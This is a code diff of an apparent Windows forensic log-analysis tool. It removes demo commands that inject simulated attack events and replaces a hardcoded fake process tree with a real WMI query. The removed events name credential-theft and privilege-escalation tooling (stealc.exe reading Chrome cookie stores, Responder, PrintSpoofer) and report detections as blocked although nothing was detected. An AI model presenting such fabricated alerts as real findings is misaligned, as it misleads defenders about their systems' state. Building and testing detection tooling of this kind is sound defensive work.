-                    Message = $"[DOSAR FORENZIC ATACATOR & ATAC FIZIC BADUSB]\n" +
-                              $"• Tip Amenințare: Hardware Keystroke Injection (BadUSB / Rubber Ducky)\n" +
-                              $"• Dispozitiv Compromis: USB HID Keyboard (VID 16C0 / PID 0486)\n" +
-                              $"• Țintă: Ocolire restricții software prin emulare tastatură fizică\n" +
-                              $"• Recomandare Apărare: Deconectare fizică imediată și aplicare politică P16-P18 Hardware Telemetry."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_BADUSB_HARDWARE",
-                    Severity = "Critical",
-                    MitreTags = "T1052.001",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Atac fizic BadUSB interceptat și oprit prin izolarea portului și neutralizarea shell-ului."
-                });
-
-                _auditService.LogAction("BADUSB_ATTACK_BLOCKED", $"{OperatorName} - VID/PID: 16C0/0486, BadUSB Keystroke Injection");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulateMfaBypassStealerAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 4663,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-Security-Auditing",
-                TimeCreated = DateTime.Now,
-                Message = "An attempt was made to access an object.\nProcess Name: C:\\Users\\user\\AppData\\Local\\Temp\\stealc.exe (Lumma / Stealc Infostealer)\nObject Name: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies (OAuth Session Tokens & MFA Bypass Cookies)\nAccess Request: ReadData / Extract SQLite DB"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Infostealerul stealc.exe a fost oprit și exfiltrarea de tokeni blocată!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 INFOSTEALER DETECTAT: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & INFOSTEALER / BYPASS MFA]\n" +
-                              $"• Tip Amenințare: Furt Cookie-uri Sesiune OAuth & Credențiale Browser (AiTM / Stealer)\n" +
-                              $"• Binar Malițios: stealc.exe (Lumma / Stealc Infostealer Family)\n" +
-                              $"• Bază Date Țintă: Chrome Network Cookies & Login Data (MFA Session Tokens)\n" +
-                              $"• Recomandare Apărare: Revocare imediată a tuturor token-urilor M365 și resetare forțată a parolei."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_INFOSTEALER_AITM",
-                    Severity = "Critical",
-                    MitreTags = "T1539 / T1556",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Infostealer neutralizat înainte de exfiltrarea bazelor de date de cookie-uri și parole din browser."
-                });
-
-                _auditService.LogAction("INFOSTEALER_BLOCKED", $"{OperatorName} - Binar: stealc.exe, Target: Chrome Cookies & MFA Tokens");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulateLlmnrPoisoningAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 5156,
-                Level = "Warning",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-Security-Auditing",
-                TimeCreated = DateTime.Now,
-                Message = "The Windows Filtering Platform has permitted a connection.\nApplication: System / LLMNR-Responder\nSource Port: 5355 (UDP) | Remote IP: 192.168.1.188 (Rogue Host - Responder.py)\nProtocol: LLMNR / NBT-NS Poisoning capturing NTLMv2 hashes"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Porturile LLMNR/NetBIOS au fost blocate pe firewall împotriva capturii NTLM!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 OTRĂVIRE REȚEA DETECTATĂ: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "High",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & OTRĂVIRE REȚEA LAN]\n" +
-                              $"• Tip Amenințare: LLMNR / NBT-NS Spoofing & NTLMv2 Hash Capture (Responder / Inveigh)\n" +
-                              $"• Nod Atacator LAN: 192.168.1.188 (Rogue Responder Host)\n" +
-                              $"• Protocol Vizat: UDP 5355 / UDP 137\n" +
-                              $"• Recomandare Apărare: Blocare porturi broadcast pe firewall și dezactivare definitivă LLMNR via GPO."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_LLMNR_RESPONDER",
-                    Severity = "High",
-                    MitreTags = "T1557.001",
-                    UserOrHost = "192.168.1.188 -> " + Environment.MachineName,
-                    Description = "Otrăvire de rețea locală Responder interceptată și porturile LLMNR blocate preventiv."
-                });
-
-                _auditService.LogAction("LLMNR_POISONING_BLOCKED", $"{OperatorName} - Rogue IP: 192.168.1.188, Tool: Responder");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulatePotatoPrivEscAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 4672,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-Security-Auditing",
-                TimeCreated = DateTime.Now,
-                Message = "Special privileges assigned to new logon.\nAccount Name: LOCAL SERVICE\nPrivileges: SeImpersonatePrivilege abused via PrintSpoofer.exe (Potato Family Exploit)\nTarget Privilege: NT AUTHORITY\\SYSTEM Token Creation"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Procesul PrintSpoofer.exe a fost terminat și escaladarea la SYSTEM oprită!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 ESCALADARE PRIVILEGII DETECTATĂ: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & ESCALADARE POTATO EXPLOIT]\n" +
-                              $"• Tip Amenințare: Token Impersonation & SeImpersonatePrivilege Abuse (PrintSpoofer / GodPotato)\n" +
-                              $"• Cont Sursă: LOCAL SERVICE -> Țintă: NT AUTHORITY\\SYSTEM\n" +
-                              $"• Recomandare Apărare: Neutralizare proces exploatator și auditare drepturi conturi de serviciu."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_POTATO_PRIVESC",
-                    Severity = "Critical",
-                    MitreTags = "T1134.001",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Tentativă de escaladare de privilegii PrintSpoofer neutralizată instant prin Scutul EDR."
-                });
-
-                _auditService.LogAction("POTATO_PRIVESC_BLOCKED", $"{OperatorName} - Exploit: PrintSpoofer, SeImpersonate to SYSTEM");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulateCpuSiliconAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 18,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "Microsoft-Windows-Kernel-WHEA",
-                TimeCreated = DateTime.Now,
-                Message = "Hardware Microarchitecture Side-Channel / Silicon Exploit detected.\nComponent: CPU Memory Controller / Speculative Execution Unit\nMechanism: Rowhammer High-Frequency DRAM Bit-Flipping & Spectre Cache Flush+Reload Leak\nTarget: Kernel Memory Isolation Boundary (KVA Shadow)"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Procesul de hammering pe siliciu a fost oprit și mitigările CPU activate!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 EXPLOIT SILICIU DETECTAT: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & ATAC PE SILICIU CPU / ROWHAMMER]\n" +
-                              $"• Tip Amenințare: Hardware Side-Channel / Microarchitectural Leak (Spectre / Rowhammer)\n" +
-                              $"• Nivel Exploit: Ring -1 (Silicon Hardware Boundary)\n" +
-                              $"• Obiectiv: Citire memorie kernel din cache și manipulare fizică a celulelor DRAM\n" +
-                              $"• Recomandare Apărare: Forțare microcod CPU actualizat, activare KVA Shadow și flush RAM."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_CPU_SILICON_EXPLOIT",
-                    Severity = "Critical",
-                    MitreTags = "T1499 / CPU Silicon",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Atac pe microarhitectura de siliciu CPU / Rowhammer interceptat și neutralizat."
-                });
-
-                _auditService.LogAction("CPU_SILICON_ATTACK_BLOCKED", $"{OperatorName} - Hardware Exploit: Rowhammer / Spectre Side-Channel");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
-
-        [RelayCommand]
-        private void SimulateAcousticFanAttack()
-        {
-            var simEvent = new ParsedEvent
-            {
-                EventId = 1048,
-                Level = "Critical",
-                MachineName = Environment.MachineName,
-                ProviderName = "DFIR-AirGap-Hardware-Sensor",
-                TimeCreated = DateTime.Now,
-                Message = "Acoustic Air-Gap Covert Channel detected (Fansmitter / TEMPEST Violation).\nMechanism: PWM Chassis Fan Speed High-Frequency Modulation (Acoustic Audio Data Broadcast)\nPayload: Encrypted data stream emitted as Morse/Acoustic wave to bypass physical network air-gap\nStandard: Violation of HG 585/2002 & NATO AC/35-D/1022 (Zero Emissivity)"
-            };
-
-            TotalLiveEventsCaptured++;
-            LiveStreamingEvents.Insert(0, simEvent);
-            Events.Insert(0, simEvent);
-
-            var alert = _liveEngine.EvaluateLiveEvent(simEvent);
-            if (alert != null)
-            {
-                LiveAlerts.Insert(0, alert);
-                IsAutoShieldTriggered = true;
-                AutoShieldMessage = "⚡ SCUT AUTOMAT EDR: Controlul PWM al ventilatoarelor a fost resetat la hardware default și procesul oprit!";
-
-                OpenAlertModal(alert, Environment.MachineName);
-                StatusMessage = $"🚨 EXFILTRARE ACUSTICĂ DETECTATĂ: {alert.Title}";
-
-                var intel = ActiveCountermeasurePlaybook?.AttackerIntel ?? new();
-                var dossierEvent = new ParsedEvent
-                {
-                    EventId = 9999,
-                    Level = "Critical",
-                    MachineName = Environment.MachineName,
-                    ProviderName = "DFIR-ThreatIntelligence-Attribution",
-                    TimeCreated = DateTime.Now,
-                    Message = $"[DOSAR FORENZIC ATACATOR & EXFILTRARE ACUSTICĂ AIR-GAP]\n" +
-                              $"• Tip Amenințare: Acoustic Air-Gap Jumping / PWM Fan Modulation (Fansmitter)\n" +
-                              $"• Canal Exfiltrare: Emisie audio acustică prin vibrația ventilatoarelor PC-ului izolat\n" +
-                              $"• Standard Securitate: HG 585/2002 & NATO AC/35-D/1022 TEMPEST Zone 0\n" +
-                              $"• Recomandare Apărare: Resetare turație BIOS/UEFI, blocare drivere PWM I/O și izolare fonică."
-                };
-
-                TotalLiveEventsCaptured++;
-                LiveStreamingEvents.Insert(0, dossierEvent);
-                Events.Insert(0, dossierEvent);
-                TimelineItems.Insert(0, new TimelineItem
-                {
-                    Timestamp = DateTime.Now,
-                    Source = "DFIR-ThreatIntelligence",
-                    Category = "CTI_ACOUSTIC_AIRGAP",
-                    Severity = "Critical",
-                    MitreTags = "T1048 / Air-Gap TEMPEST",
-                    UserOrHost = Environment.MachineName,
-                    Description = "Exfiltrare acustică prin ventilatoare (Fansmitter / Air-Gap Jumping) oprită și controlul hardware restabilit."
-                });
-
-                _auditService.LogAction("ACOUSTIC_AIRGAP_BLOCKED", $"{OperatorName} - Fansmitter Acoustic Covert Channel Blocked (TEMPEST)");
-                try { System.Media.SystemSounds.Exclamation.Play(); } catch {}
-            }
-        }
 
         private static readonly HashSet<string> ForensicExtensions = new(StringComparer.OrdinalIgnoreCase)
         {
@@ -3071,43 +2198,33 @@ namespace LogAnalyzer.UI.ViewModels
 
         private void InitializeProcessTree()
         {
+            // Real process tree of this station (WMI, read-only). Processes running from user-writable locations
+            // are marked amber; nothing here is a verdict, the detail and containment tabs are.
             ProcessTreeNodes.Clear();
-            var systemRoot = new ProcessNode { ProcessName = "System", PID = 4, RiskColor = "#a7adc2", ProcessIcon = "💻" };
-            
-            var smss = new ProcessNode { ProcessName = "smss.exe", PID = 312, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
-            systemRoot.Children.Add(smss);
-            
-            var wininit = new ProcessNode { ProcessName = "wininit.exe", PID = 620, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
-            systemRoot.Children.Add(wininit);
-            
-            var services = new ProcessNode { ProcessName = "services.exe", PID = 744, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
-            wininit.Children.Add(services);
-            
-            var svchost1 = new ProcessNode { ProcessName = "svchost.exe (netsvcs)", PID = 1044, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
-            services.Children.Add(svchost1);
-            
-            var unverifiedService = new ProcessNode { ProcessName = "malicious_service.exe", PID = 5124, RiskColor = "#ef4444", ProcessIcon = "🚨" };
-            services.Children.Add(unverifiedService);
- 
-            var winlogon = new ProcessNode { ProcessName = "winlogon.exe", PID = 688, RiskColor = "#a7adc2", ProcessIcon = "⚙️" };
-            systemRoot.Children.Add(winlogon);
-            
-            var explorer = new ProcessNode { ProcessName = "explorer.exe", PID = 4120, RiskColor = "#8b5cf6", ProcessIcon = "🖥️" };
-            winlogon.Children.Add(explorer);
- 
-            var chrome = new ProcessNode { ProcessName = "chrome.exe", PID = 5824, RiskColor = "#a7adc2", ProcessIcon = "🌐" };
-            explorer.Children.Add(chrome);
- 
-            var cmd = new ProcessNode { ProcessName = "cmd.exe", PID = 8812, RiskColor = "#f59e0b", ProcessIcon = "🐚" };
-            explorer.Children.Add(cmd);
- 
-            var powershell = new ProcessNode { ProcessName = "powershell.exe", PID = 9024, RiskColor = "#ef4444", ProcessIcon = "🚨" };
-            cmd.Children.Add(powershell);
- 
-            var whoami = new ProcessNode { ProcessName = "whoami.exe", PID = 9088, RiskColor = "#ef4444", ProcessIcon = "🚨" };
-            powershell.Children.Add(whoami);
- 
-            ProcessTreeNodes.Add(systemRoot);
+            try
+            {
+                var rows = new List<(int Pid, int Ppid, string Name, string Path)>();
+                using (var s = new System.Management.ManagementObjectSearcher("SELECT ProcessId, ParentProcessId, Name, ExecutablePath FROM Win32_Process"))
+                    foreach (System.Management.ManagementObject mo in s.Get())
+                        rows.Add((Convert.ToInt32(mo["ProcessId"]), Convert.ToInt32(mo["ParentProcessId"]), mo["Name"] as string ?? "", mo["ExecutablePath"] as string ?? ""));
+                var pids = rows.Select(r => r.Pid).ToHashSet();
+                var nodes = rows.ToDictionary(r => r.Pid, r => new ProcessNode
+                {
+                    ProcessName = r.Path.Length > 0 ? $"{r.Name}  —  {r.Path}" : r.Name,
+                    PID = r.Pid,
+                    RiskColor = LogAnalyzer.Dfir.Analysis.Correlation.IsUserWritable(r.Path) ? "#f59e0b" : "#a7adc2",
+                    ProcessIcon = "•",
+                });
+                foreach (var r in rows.OrderBy(r => r.Pid))
+                {
+                    if (r.Pid != r.Ppid && pids.Contains(r.Ppid) && r.Pid != 0) nodes[r.Ppid].Children.Add(nodes[r.Pid]);
+                    else ProcessTreeNodes.Add(nodes[r.Pid]);
+                }
+            }
+            catch (System.Management.ManagementException ex)
+            {
+                StatusMessage = "Arborele de procese nu a putut fi citit: " + ex.Message;
+            }
         }
 
         private void InitializeSigmaRules()
@@ -3137,27 +2254,27 @@ namespace LogAnalyzer.UI.ViewModels
             {
                 // 1. ACCES INIȚIAL
                 new MitreTechnique { Tactic = "InitialAccess", TechId = "T1190", Name = "Exploit Public-Facing Application", HasDot = false },
-                new MitreTechnique { Tactic = "InitialAccess", TechId = "T1566.001", Name = "Spearphishing Attachment", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "InitialAccess", TechId = "T1566.001", Name = "Spearphishing Attachment", HasDot = false },
                 new MitreTechnique { Tactic = "InitialAccess", TechId = "T1566.002", Name = "Spearphishing Link", HasDot = false },
-                new MitreTechnique { Tactic = "InitialAccess", TechId = "T1078", Name = "Valid Accounts", HasDot = true, DotColor = "#fbbf24" },
-                new MitreTechnique { Tactic = "InitialAccess", TechId = "T1052.001", Name = "Exfiltration: BadUSB / HID", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "InitialAccess", TechId = "T1078", Name = "Valid Accounts", HasDot = false },
+                new MitreTechnique { Tactic = "InitialAccess", TechId = "T1052.001", Name = "Exfiltration: BadUSB / HID", HasDot = false },
                 new MitreTechnique { Tactic = "InitialAccess", TechId = "T1189", Name = "Drive-by Compromise", HasDot = false },
                 new MitreTechnique { Tactic = "InitialAccess", TechId = "T1195", Name = "Supply Chain Compromise", HasDot = false },
                 new MitreTechnique { Tactic = "InitialAccess", TechId = "T1133", Name = "External Remote Services", HasDot = false },
 
                 // 2. EXECUȚIE
-                new MitreTechnique { Tactic = "Execution", TechId = "T1059.001", Name = "PowerShell ScriptBlock", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "Execution", TechId = "T1059.003", Name = "Windows Command Shell", HasDot = true, DotColor = "#fbbf24" },
+                new MitreTechnique { Tactic = "Execution", TechId = "T1059.001", Name = "PowerShell ScriptBlock", HasDot = false },
+                new MitreTechnique { Tactic = "Execution", TechId = "T1059.003", Name = "Windows Command Shell", HasDot = false },
                 new MitreTechnique { Tactic = "Execution", TechId = "T1059.005", Name = "Visual Basic Scripts (VBS)", HasDot = false },
-                new MitreTechnique { Tactic = "Execution", TechId = "T1047", Name = "WMI Execution", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "Execution", TechId = "T1047", Name = "WMI Execution", HasDot = false },
                 new MitreTechnique { Tactic = "Execution", TechId = "T1053.005", Name = "Scheduled Task Exec", HasDot = false },
                 new MitreTechnique { Tactic = "Execution", TechId = "T1204.002", Name = "Malicious File Execution", HasDot = false },
                 new MitreTechnique { Tactic = "Execution", TechId = "T1106", Name = "Native API Execution", HasDot = false },
                 new MitreTechnique { Tactic = "Execution", TechId = "T1569.002", Name = "Service Exec (PsExec)", HasDot = false },
 
                 // 3. PERSISTENȚĂ
-                new MitreTechnique { Tactic = "Persistence", TechId = "T1547.001", Name = "Registry Run Keys / Startup", HasDot = true, DotColor = "#fbbf24" },
-                new MitreTechnique { Tactic = "Persistence", TechId = "T1543.003", Name = "Windows Service Creation", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "Persistence", TechId = "T1547.001", Name = "Registry Run Keys / Startup", HasDot = false },
+                new MitreTechnique { Tactic = "Persistence", TechId = "T1543.003", Name = "Windows Service Creation", HasDot = false },
                 new MitreTechnique { Tactic = "Persistence", TechId = "T1053.002", Name = "At/Cron Persistent Task", HasDot = false },
                 new MitreTechnique { Tactic = "Persistence", TechId = "T1574.002", Name = "DLL Side-Loading", HasDot = false },
                 new MitreTechnique { Tactic = "Persistence", TechId = "T1546.015", Name = "COM Object Hijacking", HasDot = false },
@@ -3166,18 +2283,18 @@ namespace LogAnalyzer.UI.ViewModels
                 new MitreTechnique { Tactic = "Persistence", TechId = "T1505.003", Name = "Web Shell Persistence", HasDot = false },
 
                 // 4. ESCALADARE PRIVILEGII
-                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1134.001", Name = "Token Impersonation (Potato)", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1068", Name = "Kernel Exploitation (BYOVD)", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1055.012", Name = "Process Hollowing RAM", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1548.002", Name = "Bypass UAC", HasDot = true, DotColor = "#fbbf24" },
+                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1134.001", Name = "Token Impersonation (Potato)", HasDot = false },
+                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1068", Name = "Kernel Exploitation (BYOVD)", HasDot = false },
+                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1055.012", Name = "Process Hollowing RAM", HasDot = false },
+                new MitreTechnique { Tactic = "PrivEsc", TechId = "T1548.002", Name = "Bypass UAC", HasDot = false },
                 new MitreTechnique { Tactic = "PrivEsc", TechId = "T1055.001", Name = "DLL Injection", HasDot = false },
                 new MitreTechnique { Tactic = "PrivEsc", TechId = "T1078.002", Name = "Domain Admin Compromise", HasDot = false },
                 new MitreTechnique { Tactic = "PrivEsc", TechId = "T1484.001", Name = "Group Policy Mod", HasDot = false },
                 new MitreTechnique { Tactic = "PrivEsc", TechId = "T1546.008", Name = "Accessibility Features Abuse", HasDot = false },
 
                 // 5. EVAZIUNE APĂRARE
-                new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1027", Name = "Obfuscated Files / Info", HasDot = true, DotColor = "#fbbf24" },
-                new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1562.001", Name = "Disable Security Tools (EDR)", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1027", Name = "Obfuscated Files / Info", HasDot = false },
+                new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1562.001", Name = "Disable Security Tools (EDR)", HasDot = false },
                 new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1070.001", Name = "Clear Windows Event Logs", HasDot = false },
                 new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1218.011", Name = "Proxy Binary: Rundll32", HasDot = false },
                 new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1140", Name = "Deobfuscate/Decode", HasDot = false },
@@ -3186,19 +2303,19 @@ namespace LogAnalyzer.UI.ViewModels
                 new MitreTechnique { Tactic = "DefenseEvasion", TechId = "T1055.004", Name = "Async Procedure Call", HasDot = false },
 
                 // 6. ACCES CREDENȚIALE
-                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1003.001", Name = "LSASS Memory Dumping", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1003.002", Name = "SAM Registry Hive", HasDot = true, DotColor = "#fbbf24" },
-                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1557.001", Name = "LLMNR / NBT-NS Poisoning", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1539", Name = "Steal Web MFA Cookies", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1003.001", Name = "LSASS Memory Dumping", HasDot = false },
+                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1003.002", Name = "SAM Registry Hive", HasDot = false },
+                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1557.001", Name = "LLMNR / NBT-NS Poisoning", HasDot = false },
+                new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1539", Name = "Steal Web MFA Cookies", HasDot = false },
                 new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1110.001", Name = "Password Guessing", HasDot = false },
                 new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1558.003", Name = "Kerberoasting (TGS)", HasDot = false },
                 new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1555.003", Name = "Browser Credentials", HasDot = false },
                 new MitreTechnique { Tactic = "CredentialAccess", TechId = "T1040", Name = "Network Sniffing", HasDot = false },
 
                 // 7. IMPACT
-                new MitreTechnique { Tactic = "Impact", TechId = "T1486", Name = "Data Encrypted (Ransom)", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "Impact", TechId = "T1489", Name = "Service Stop & Disruption", HasDot = true, DotColor = "#ef4444" },
-                new MitreTechnique { Tactic = "Impact", TechId = "T1490", Name = "Inhibit Recovery (VSS)", HasDot = true, DotColor = "#ef4444" },
+                new MitreTechnique { Tactic = "Impact", TechId = "T1486", Name = "Data Encrypted (Ransom)", HasDot = false },
+                new MitreTechnique { Tactic = "Impact", TechId = "T1489", Name = "Service Stop & Disruption", HasDot = false },
+                new MitreTechnique { Tactic = "Impact", TechId = "T1490", Name = "Inhibit Recovery (VSS)", HasDot = false },
                 new MitreTechnique { Tactic = "Impact", TechId = "T1485", Name = "Data Destruction", HasDot = false },
                 new MitreTechnique { Tactic = "Impact", TechId = "T1529", Name = "System Shutdown / Reboot", HasDot = false },
                 new MitreTechnique { Tactic = "Impact", TechId = "T1499", Name = "Endpoint Denial of Service", HasDot = false },
@@ -3309,7 +2426,7 @@ namespace LogAnalyzer.UI.ViewModels
                         Severity = a.Severity,
                         SeverityColor = a.Severity == "Critical" ? "#ef4444" : a.Severity == "High" ? "#f97316" : "#f59e0b",
                         MitreId = a.MitreTechniqueId ?? "T1027",
-                        Timestamp = a.RelatedEvents.FirstOrDefault()?.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") ?? DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
+                        Timestamp = a.RelatedEvents.FirstOrDefault()?.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") ?? ""
                     });
                 }
 
@@ -3324,7 +2441,7 @@ namespace LogAnalyzer.UI.ViewModels
                         Severity = y.Severity,
                         SeverityColor = "#ef4444",
                         MitreId = y.MitreTechniqueId ?? "T1059",
-                        Timestamp = y.RelatedEvents.FirstOrDefault()?.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") ?? DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
+                        Timestamp = y.RelatedEvents.FirstOrDefault()?.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss") ?? ""
                     });
                 }
 
